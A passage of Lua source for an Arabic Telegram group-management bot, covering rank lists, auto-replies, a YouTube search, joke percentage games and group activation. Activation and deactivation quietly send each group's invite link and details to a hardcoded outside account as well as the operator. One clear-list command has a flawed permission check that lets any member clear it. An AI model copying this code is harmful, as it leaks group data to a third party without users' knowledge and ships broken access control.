local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Creator") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• لا يوجد المالكين*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." • *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'المنشئين الاساسيين' then
t = '\n*• قائمه '..text..'  \n ━━━━━━━━━━━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:BasicConstructor") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." • *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'المنشئين' then
t = '\n*• قائمه '..text..'  \n ━━━━━━━━━━━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Constructor") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." • *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'المدراء' then
t = '\n*• قائمه '..text..'  \n ━━━━━━━━━━━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Owner") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." • *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'الادمنيه' then
t = '\n*• قائمه '..text..'  \n ━━━━━━━━━━━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Administrator") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." • *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'المميزين' then
t = '\n*• قائمه '..text..'  \n ━━━━━━━━━━━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Vips") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." • *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
----------------------------------------------------------------------------------------------------
end
if text == 'مسح الثانويين' or text == 'مسح المطورين الثانويين' and devB(msg.sender.user_id) then
local Info_ = redis:smembers(bot_id..":Status:programmer") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم مسح "..text:gsub('مسح',"").." سابقاً*").yu,"md",true)  
return false
end  
redis:del(bot_id..":Status:programmer") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم "..text.." *").yu,"md",true)  
end
if text == 'مسح المطورين' and programmer(msg) then
local Info_ = redis:smembers(bot_id..":Status:developer") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم مسح "..text:gsub('مسح',"").." سابقاً*").yu,"md",true)  
return false
end  
redis:del(bot_id..":Status:developer") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم "..text.." *").yu,"md",true)  
end
if text == 'مسح المالكين' and developer(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Creator") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم مسح "..text:gsub('مسح',"").." سابقاً*").yu,"md",true)  
return false
end  
redis:del(bot_id..":"..msg.chat_id..":Status:Creator") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم "..text.." *").yu,"md",true)  
end
if text == 'مسح المنشئين الاساسيين' and Creator(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:BasicConstructor") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم مسح "..text:gsub('مسح',"").." سابقاً*").yu,"md",true)  
return false
end  
redis:del(bot_id..":"..msg.chat_id..":Status:BasicConstructor") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم "..text.." *").yu,"md",true)  
end
if text == 'مسح المنشئين' and BasicConstructor(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Constructor") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم مسح "..text:gsub('مسح',"").." سابقاً*").yu,"md",true)  
return false
end  
redis:del(bot_id..":"..msg.chat_id..":Status:Constructor") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم "..text.." *").yu,"md",true)  
end
if text == 'مسح المدراء' and Constructor(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Owner") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم مسح "..text:gsub('مسح',"").." سابقاً*").yu,"md",true)  
return false
end  
redis:del(bot_id..":"..msg.chat_id..":Status:Owner") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم "..text.." *").yu,"md",true)  
end
if text == 'مسح الادمنيه' and Owner(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Administrator") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم مسح "..text:gsub('مسح',"").." سابقاً*").yu,"md",true)  
return false
end  
redis:del(bot_id..":"..msg.chat_id..":Status:Administrator") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم "..text.." *").yu,"md",true)  
end
if text == 'مسح المميزين' and Administrator(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Vips") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم مسح "..text:gsub('مسح',"").." سابقاً*").yu,"md",true)  
return false
end  
redis:del(bot_id..":"..msg.chat_id..":Status:Vips") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم "..text.." *").yu,"md",true)  
end
----------------------------------------------------------------------------------------------------
if text and not redis:get(bot_id..":"..msg.chat_id..":settings:Reply") then
if text and redis:sismember(bot_id..'List:array'..msg.chat_id,text) then
local list = redis:smembers(bot_id.."Add:Rd:array:Text"..text..msg.chat_id)
return bot.sendText(msg.chat_id,msg.id,"["..list[math.random(#list)].."]","md",true)
end  
if not redis:sismember(bot_id..'Spam:Group'..msg.sender.user_id,text) then
local Text = redis:get(bot_id.."Rp:content:Text"..msg.chat_id..":"..text)
local VoiceNote = redis:get(bot_id.."Rp:content:VoiceNote"..msg.chat_id..":"..text) 
local photo = redis:get(bot_id.."Rp:content:Photo"..msg.chat_id..":"..text)
local vido = redis:get(bot_id.."Rp:content:Video"..msg.chat_id..":"..text)
local stickr = redis:get(bot_id.."Rp:content:Sticker"..msg.chat_id..":"..text)
local anima = redis:get(bot_id.."Rp:content:Animation"..msg.chat_id..":"..text)
local document = redis:get(bot_id.."Rp:Manager:File"..msg.chat_id..":"..text)
local audio = redis:get(bot_id.."Rp:content:Audio"..msg.chat_id..":"..text)
local VoiceNotecaption = redis:get(bot_id.."Rp:content:VoiceNote:caption"..msg.chat_id..":"..text) or ""
local photocaption = redis:get(bot_id.."Rp:content:Photo:caption"..msg.chat_id..":"..text) or ""
local vidocaption = redis:get(bot_id.."Rp:content:Video:caption"..msg.chat_id..":"..text) or ""
local animacaption = redis:get(bot_id.."Rp:content:Animation:caption"..msg.chat_id..":"..text) or ""
local documentcaption = redis:get(bot_id.."Rp:Manager:File:caption"..msg.chat_id..":"..text) or ""
local audiocaption = redis:get(bot_id.."Rp:content:Audio:caption"..msg.chat_id..":"..text) or ""
if Text  then
local UserInfo = bot.getUser(msg.sender.user_id)
local countMsg = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1
local totlmsg = Total_message(countMsg) 
local getst = Get_Rank(msg.sender.user_id,msg.chat_id)
local countedit = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage") or 0
local Text = Text:gsub('#username',(UserInfo.username or 'لا يوجد')):gsub('#name',UserInfo.first_name):gsub('#id',msg.sender.user_id):gsub('#edit',countedit):gsub('#msgs',countMsg):gsub('#stast',getst)
if Text:match("]") then
bot.sendText(msg.chat_id,msg.id,""..Text.."","md",true)  
else
bot.sendText(msg.chat_id,msg.id,"["..Text.."]","md",true)  
end
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end
if photo  then
bot.sendPhoto(msg.chat_id, msg.id, photo,photocaption)
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if vido  then
bot.sendVideo(msg.chat_id, msg.id, vido,vidocaption)
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if stickr  then
bot.sendSticker(msg.chat_id, msg.id, stickr,stickrcaption)
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if anima  then
bot.sendAnimation(msg.chat_id, msg.id, anima,animacaption)
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if VoiceNote then
bot.sendVoiceNote(msg.chat_id, msg.id, VoiceNote,"["..VoiceNotecaption.."]", "md")
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end
if document  then
bot.sendDocument(msg.chat_id, msg.id, document,"["..documentcaption.."]", "md")
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if audio  then
bot.sendAudio(msg.chat_id, msg.id, audio,"["..audiocaption.."]", "md")
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end
end 
end


----------------------------------------------------------------------------------------------------
if not redis:sismember(bot_id..'Spam:Group'..msg.sender.user_id,text) then
local Text = redis:get(bot_id.."Rp:content:Textg"..msg.chat_id..":"..text)
if Text  then
local UserInfo = bot.getUser(msg.sender.user_id)
local countMsg = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1
local totlmsg = Total_message(countMsg) 
local getst = Get_Rank(msg.sender.user_id,msg.chat_id)
local countedit = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage") or 0
local Text = Text:gsub('#username',(UserInfo.username or 'لا يوجد')):gsub('#name',UserInfo.first_name):gsub('#id',msg.sender.user_id):gsub('#edit',countedit):gsub('#msgs',countMsg):gsub('#stast',getst)
if Text:match("]") then
bot.sendText(msg.chat_id,msg.id,""..Text.."","md",true)  
else
bot.sendText(msg.chat_id,msg.id,"["..Text.."]","md",true)  
end
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end
end 
----------------------------------------------------------------------------------------------------
if text and redis:sismember(bot_id..'List:arrayy',text) then
local list = redis:smembers(bot_id.."Add:Rd:array:Textt"..text)
return bot.sendText(msg.chat_id,msg.id,"["..list[math.random(#list)].."]","md",true)  
end  
----------------------------------------------------------------------------------------------------
if msg.content.text then
if text:match("^بحث (.*)$") then
if not redis:get(bot_id.."youutube"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • اليوتيوب معطل من قبل المشرفين","md",true)
end
local search = text:match("^بحث (.*)$")
local get = io.popen('curl -s "https://globaloneshot.site/yotube_search.php?text='..URL.escape(search)..'"'):read('*a')
local j = JSON.decode(get) 
local json = j.results 
local datar = {data = {{text = "‹ ‹ TeAm MeLaNo  ›  ›" , url = 'http://t.me/QQOQQD'}}}
for i = 1,10 do
title = json[i].title
link = json[i].url
datar[i] = {{text = title , data =msg.sender.user_id.."dl/"..link}}
end
local reply_markup = bot.replyMarkup{
type = 'inline',
data = datar
}
bot.sendText(msg.chat_id,msg.id,'• نتائج بحثك ل *'..search..'*',"md",false, false, false, false, reply_markup)
end
end

---------------------------------------------------------------------------------------------------
end
----------------------------------------------------------------------------------------------------
-- نهايه التفعيل

if redis:get(bot_id..":"..msg.sender.user_id..":lov_Bots"..msg.chat_id) == "sendlove" then
num = {"😂 10","🤤 20","😢 30","😔 35","😒 75","🤩 34","😗 66","🤐 82","😪 23","😫 19","😛 55","😜 80","😲 63","😓 32","🙂 27","😎 89","😋 99","😁 98","😀 79","🤣 100","😣 8","🙄 3","😕 6","🤯 0",};
sendnum = num[math.random(#num)]
local tttttt = '• نسبة الحب بيـن : '..text..' '..sendnum..' %'
bot.sendText(msg.chat_id,msg.id,tttttt) 
redis:del(bot_id..":"..msg.sender.user_id..":lov_Bots"..msg.chat_id)
end
if redis:get(bot_id..":"..msg.sender.user_id..":lov_Bottts"..msg.chat_id) == "sendlove" then
num = {"😂 10","🤤 20","😢 30","😔 35","😒 75","🤩 34","😗 66","🤐 82","😪 23","😫 19","😛 55","😜 80","😲 63","😓 32","🙂 27","😎 89","😋 99","😁 98","😀 79","🤣 100","😣 8","🙄 3","😕 6","🤯 0",};
sendnum = num[math.random(#num)]
local tttttt = '• نسبة غباء : '..text..' '..sendnum..' %'
bot.sendText(msg.chat_id,msg.id,tttttt) 
redis:del(bot_id..":"..msg.sender.user_id..":lov_Bottts"..msg.chat_id)
end
if redis:get(bot_id..":"..msg.sender.user_id..":lov_Botttuus"..msg.chat_id) == "sendlove" then
num = {"😂 10","🤤 20","😢 30","😔 35","😒 75","🤩 34","😗 66","🤐 82","😪 23","😫 19","😛 55","😜 80","😲 63","😓 32","🙂 27","😎 89","😋 99","😁 98","😀 79","🤣 100","😣 8","🙄 3","😕 6","🤯 0",};
sendnum = num[math.random(#num)]
local tttttt = '• نسبة الذكاء : '..text..' '..sendnum..' %'
bot.sendText(msg.chat_id,msg.id,tttttt) 
redis:del(bot_id..":"..msg.sender.user_id..":lov_Botttuus"..msg.chat_id)
end
if text and redis:get(bot_id..":"..msg.sender.user_id..":krh_Bots"..msg.chat_id) == "sendkrhe" then
num = {"😂 10","🤤 20","😢 30","😔 35","😒 75","🤩 34","😗 66","🤐 82","😪 23","😫 19","😛 55","😜 80","😲 63","😓 32","🙂 27","😎 89","😋 99","😁 98","😀 79","🤣 100","😣 8","🙄 3","😕 6","🤯 0",};
sendnum = num[math.random(#num)]
local tttttt = '• نسبه الكره : '..text..' '..sendnum..' %'
bot.sendText(msg.chat_id,msg.id,tttttt) 
redis:del(bot_id..":"..msg.sender.user_id..":krh_Bots"..msg.chat_id)
end
if text and text ~="نسبه الرجوله" and redis:get(bot_id..":"..msg.sender.user_id..":rjo_Bots"..msg.chat_id) == "sendrjoe" then
numj = {"😂 10","🤤 20","?? 30","?? 35","😒 75","🤩 34","😗 66","🤐 82","😪 23","😫 19","😛 55","😜 80","😲 63","😓 32","🙂 27","😎 89","😋 99","😁 98","🥰 79","🤣 100","😣 8","🙄 3","😕 6","🤯 0",};
sendnuj = numj[math.random(#numj)]
local tttttt = '• نسبة الرجوله : '..text..' '..sendnuj..' %'
bot.sendText(msg.chat_id,msg.id,tttttt) 
redis:del(bot_id..":"..msg.sender.user_id..":rjo_Bots"..msg.chat_id)
end
if text and text ~="نسبه الانوثه" and redis:get(bot_id..":"..msg.sender.user_id..":ano_Bots"..msg.chat_id) == "sendanoe" then
numj = {"😂 10","🤤 20","😢 30","😔 35","😒 75","🤩 34","😗 66","🤐 82","😪 23","😫 19","😛 55","😜 80","😲 63","😓 32","🙂 27","😎 89","😋 99","?? 98","😀 79","🤣 100","😣 8","🙄 3","😕 6","🤯 0",};
sendnuj = numj[math.random(#numj)]
local tttttt = '• نسبه الانوثة : '..text..' '..sendnuj..' %'
bot.sendText(msg.chat_id,msg.id,tttttt) 
redis:del(bot_id..":"..msg.sender.user_id..":ano_Bots"..msg.chat_id)
end

if redis:get(bot_id..'Status:aktbas'..msg.chat_id) == 'true' then
if msg.forward_info or text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo then
bot.sendText(msg.chat_id,0,"-","md",true)
end
end
if text == 'السورس' or text == 'سورس' or text == 'ياسورس' or text == 'يا سورس' then  
if ChannelJoin(msg) == false then
local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo ', url = 't.me/QQOQQD'}, },}}
return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)
end
local Text = "*𓄼• ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 𝐒ᴏᴜʀᴄᴇ raumo𓄼•*"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '❲Source Channel❳', url = "https://t.me/QQOQQD"},{text = '❲Exp Source❳', url = "https://t.me/melno88"}
},
{
{text = '❲Developer ❳', url = "https://t.me/OR_33"}
},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/lMlMMM/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
----------------------------------------------------------------------------------------------------
if text and text:match("^تعيين عدد الاعضاء (%d+)$") then
if not devB(msg.sender.user_id) then 
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المطور الاساسي * ',"md",true)  
end
redis:set(bot_id..'Num:Add:Bot',text:match("تعيين عدد الاعضاء (%d+)$") ) 
bot.sendText(msg.chat_id,msg.id,'*• تم تعيين عدد اعضاء تفعيل البوت\n اكثر من ( '..text:match("تعيين عدد الاعضاء (%d+)$")..' ) عضو *',"md",true)  
end

if text and text:match("^حظر المجموعه (.*)$") then
if not devB(msg.sender.user_id) then 
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المطور الاساسي * ',"md",true)  
end
local txx = text:match("^حظر المجموعه (.*)$")
if txx:match("^-100(%d+)$") then
redis:sadd(bot_id..'ban:online',txx)
bot.sendText(msg.chat_id,msg.id,'\n• تم حظر المجموعة من البوت ',"md",true)  
else
bot.sendText(msg.chat_id,msg.id,'\n• اكتب ايدي المجموعة بشكل صحيح ',"md",true)  
end
end
if text and text:match("^الغاء حظر المجموعه (.*)$") then
if not devB(msg.sender.user_id) then 
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المطور الاساسي * ',"md",true)  
end
local txx = text:match("^الغاء حظر المجموعه (.*)$")
if txx:match("^-100(%d+)$") then
redis:srem(bot_id..'ban:online',txx)
bot.sendText(msg.chat_id,msg.id,'\n• تم الغاء حظر المجموعة من البوت ',"md",true)  
else
bot.sendText(msg.chat_id,msg.id,'\n• اكتب ايدي المجموعة بشكل صحيح ',"md",true)  
end
end

if text == 'تفعيل' then
if redis:sismember(bot_id..'ban:online',msg.chat_id) then
sleep(1)
bot.leaveChat(msg.chat_id)
return bot.sendText(msg.chat_id,msg.id,"\n*↯︙هذه المجموعة محظور سوف اغادر جاوو*","md",true)  
end
if msg.can_be_deleted_for_all_users == false then
bot.sendText(msg.chat_id,msg.id,"*• عذراً البوت ليس ادمن في المجموعة*","md",true)  
return false
end
sm = bot.getChatMember(msg.chat_id,msg.sender.user_id)
if not developer(msg) then
if sm.status.luatele ~= "chatMemberStatusCreator" and sm.status.luatele ~= "chatMemberStatusAdministrator" then
bot.sendText(msg.chat_id,msg.id,"*• عذراً يجب أنْ تكون مشرف او مالك المجموعة*","md",true)  
return false
end
end
if sm.status.luatele == "chatMemberStatusCreator" then
redis:sadd(bot_id..":"..msg.chat_id..":Status:Creator",msg.sender.user_id)
else
redis:sadd(bot_id..":"..msg.chat_id..":Status:Administrator",msg.sender.user_id)
end
local Info_Chats = bot.getSupergroupFullInfo(msg.chat_id)
if tonumber(Info_Chats.member_count) < tonumber((redis:get(bot_id..'Num:Add:Bot') or 0)) and not devB(msg.sender.user_id) then
bot.sendText(msg.chat_id,msg.id,'• عدد الاعضاء قليل لا يمكن تفعيل المجموعة\n يجب ان يكون اكثر من '..redis:get(bot_id..'Num:Add:Bot'),"md",true)
sleep(1)
bot.leaveChat(msg.chat_id)
end
if redis:sismember(bot_id..":Groups",msg.chat_id) then
 bot.sendText(msg.chat_id,msg.id,'*↯︙المجموعة مفعلة من قبل *',"md",true)  
return false
else
Get_Chat = bot.getChat(msg.chat_id)
Info_Chats = bot.getSupergroupFullInfo(msg.chat_id)
if not devB(msg.sender.user_id) then
local UserInfo = bot.getUser(msg.sender.user_id)
for Name_User in string.gmatch(UserInfo.first_name, "[^%s]+" ) do
UserInfo.first_name = Name_User
end
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}, 
},
{
{text = 'مغادرة المجموعة', data = '/leftgroup@'..msg.chat_id}, 
},
}
}
bot.sendText(sudoid,0,'*\n• تم تفعيل المجموعه جديد \n• من قبل ↤ *['..UserInfo.first_name..'](tg://user?id='..msg.sender.user_id..')*\n• معلومات المجموعة :\n• عدد الاعضاء ↤ '..Info_Chats.member_count..'\n• عدد الادمنيه ↤ '..Info_Chats.administrator_count..'\n• عدد المطرودين ↤ '..Info_Chats.banned_count..'\n• عدد المقيدين ↤ '..Info_Chats.restricted_count..'\n• الرابط\n : '..Info_Chats.invite_link.invite_link..'*',"md", true, false, false, false, reply_markup)
bot.sendText(1342680269,0,'*\n• تم تفعيل المجموعه جديد \n• من قبل ↤ *['..UserInfo.first_name..'](tg://user?id='..msg.sender.user_id..')*\n• معلومات المجموعة :\n• عدد الاعضاء ↤ '..Info_Chats.member_count..'\n• عدد الادمنيه ↤ '..Info_Chats.administrator_count..'\n• عدد المطرودين ↤ '..Info_Chats.banned_count..'\n• عدد المقيدين ↤ '..Info_Chats.restricted_count..'\n• الرابط\n : '..Info_Chats.invite_link.invite_link..'*',"md", true, false, false, false, reply_markup)
end
redis:sadd(bot_id..":Groups",msg.chat_id)
redis:set(bot_id..'tagallgroup'..msg.chat_id,'open') 
redis:set(bot_id.."Status:Link"..msg.chat_id,true) 
redis:set(bot_id.."Status:Games"..msg.chat_id,true) 
redis:set(bot_id.."Status:Reply"..msg.chat_id,true) 
redis:set(bot_id.."calculate"..msg.chat_id,true) 
redis:set(bot_id.."name:k"..msg.chat_id,true) 
redis:set(bot_id.."brjj"..msg.chat_id,true) 
redis:set(bot_id.."myzhrfa"..msg.chat_id,true) 
redis:set(bot_id.."idnotmembio"..msg.chat_id,true) 
redis:set(bot_id.."Abs:kol:Abs"..msg.chat_id,true) 
redis:set(bot_id.."Abs:Addme:Abs"..msg.chat_id,true) 
redis:set(bot_id.."Abs:Nzlne:Abs"..msg.chat_id,true) 
redis:set(bot_id.."taggg"..msg.chat_id,true) 
redis:set(bot_id.."redis:setRt"..msg.chat_id,true) 
redis:set(bot_id.."youutube"..msg.chat_id,true) 
redis:set(bot_id.."thnaee"..msg.chat_id,true) 
redis:set(bot_id.."shakse"..msg.chat_id,true) 
redis:set(bot_id.."indar"..msg.chat_id,true) 
redis:set(bot_id.."dartba"..msg.chat_id,true) 
redis:set(bot_id.."shapeh"..msg.chat_id,true) 
redis:set(bot_id.."anamen"..msg.chat_id,true) 
redis:set(bot_id.."trfeh"..msg.chat_id,true) 
redis:set(bot_id.."aftare"..msg.chat_id,true) 
redis:set(bot_id.."ttzog"..msg.chat_id,true) 
redis:set(bot_id.."zogne"..msg.chat_id,true) 
redis:set(bot_id.."nsab"..msg.chat_id,true) 
redis:set(bot_id.."AlThther:Chat"..msg.chat_id,"true")
redis:set(bot_id.."replayallbot"..msg.chat_id,true)
redis:set(bot_id.."Status:Welcome"..msg.chat_id,true) 
redis:set(bot_id.."AlThther:Chat"..msg.chat_id,"true")
redis:set(bot_id..'lockalllll'..msg.chat_id,'on') 
redis:set(bot_id.."Status:IdPhoto"..msg.chat_id,true) 
redis:del(bot_id.."spammkick"..msg.chat_id)
redis:set(bot_id.."Lock:edit"..msg.chat_id,true) 
redis:set(bot_id.."market"..msg.chat_id,true) 
redis:sadd(bot_id.."ChekBotAdd",msg.chat_id)
redis:set(bot_id.."Status:Games"..msg.chat_id,true) 
redis:set(bot_id.."Status:Id"..msg.chat_id,true) ;redis:set(bot_id.."Status:Reply"..msg.chat_id,true) ;redis:set(bot_id.."Status:ReplySudo"..msg.chat_id,true) ;redis:set(bot_id.."Status:BanId"..msg.chat_id,true) ;redis:set(bot_id.."Status:SetId"..msg.chat_id,true) 
local Info_Members = bot.getSupergroupMembers(msg.chat_id, "Administrators", "*", 0, 200)
local List_Members = Info_Members.members
x = 0
y = 0
for k, v in pairs(List_Members) do
if Info_Members.members[k].bot_info == nil then
if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
redis:sadd(bot_id..":"..msg.chat_id..":Status:Creator",v.member_id.user_id) 
x = x + 1
else
redis:sadd(bot_id..":"..msg.chat_id..":Status:Administrator",v.member_id.user_id) 
y = y + 1
end
end
end
local txt = '*↯︙تم تفعيل  المجموعة *['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')'
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›', url = 't.me/QQOQQD'}, 
},
}
}
return bot.sendText(msg.chat_id, msg.id, txt, 'md', false, false, false, false, reply_markup)
end
end
if text == 'تعطيل' then
if msg.can_be_deleted_for_all_users == false then
bot.sendText(msg.chat_id,msg.id,"*• عذراً البوت ليس ادمن في المجموعة .*","md",true)  
return false
end
sm = bot.getChatMember(msg.chat_id,msg.sender.user_id)
if not developer(msg) then
if sm.status.luatele ~= "chatMemberStatusCreator" then
bot.sendText(msg.chat_id,msg.id,"*• عذراً يجب أن تكون مالك المجموعة *","md",true)  
return false
end
end
if redis:sismember(bot_id..":Groups",msg.chat_id) then
Get_Chat = bot.getChat(msg.chat_id)
Info_Chats = bot.getSupergroupFullInfo(msg.chat_id)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}},
}
}
UserInfo = bot.getUser(msg.sender.user_id).first_name
bot.sendText(sudoid,0,'*\n• تم تعطيل المجموعه : \n• من قبل ↤ *['..UserInfo..'](tg://user?id='..msg.sender.user_id..')*\n• معلومات المجموعة :\n• عدد الاعضاء ↤ '..Info_Chats.member_count..' \n• عدد الادمنيه ↤ '..Info_Chats.administrator_count..'\n• عدد المطرودين ↤ '..Info_Chats.banned_count..'\n• عدد المقيدين ↤ '..Info_Chats.restricted_count..'\n• الرابط\n : '..Info_Chats.invite_link.invite_link..'*',"md", true, false, false, false, reply_markup)
bot.sendText(1342680269,0,'*\n• تم تعطيل المجموعه : \n• من قبل ↤ *['..UserInfo..'](tg://user?id='..msg.sender.user_id..')*\n• معلومات المجموعة :\n• عدد الاعضاء ↤ '..Info_Chats.member_count..' \n• عدد الادمنيه ↤ '..Info_Chats.administrator_count..'\n• عدد المطرودين ↤ '..Info_Chats.banned_count..'\n• عدد المقيدين ↤ '..Info_Chats.restricted_count..'\n• الرابط\n : '..Info_Chats.invite_link.invite_link..'*',"md", true, false, false, false, reply_markup)
bot.sendText(msg.chat_id,msg.id,'*↯︙تم تعطيل  المجموعة *',"md",true, false, false, false, reply_markup)
redis:srem(bot_id..":Groups",msg.chat_id)
local keys = redis:keys(bot_id..'*'..'-100'..data.supergroup.id..'*')
redis:del(bot_id..":"..msg.chat_id..":Status:Creator")
redis:del(bot_id..":"..msg.chat_id..":Status:BasicConstructor")
redis:del(bot_id..":"..msg.chat_id..":Status:Constructor")
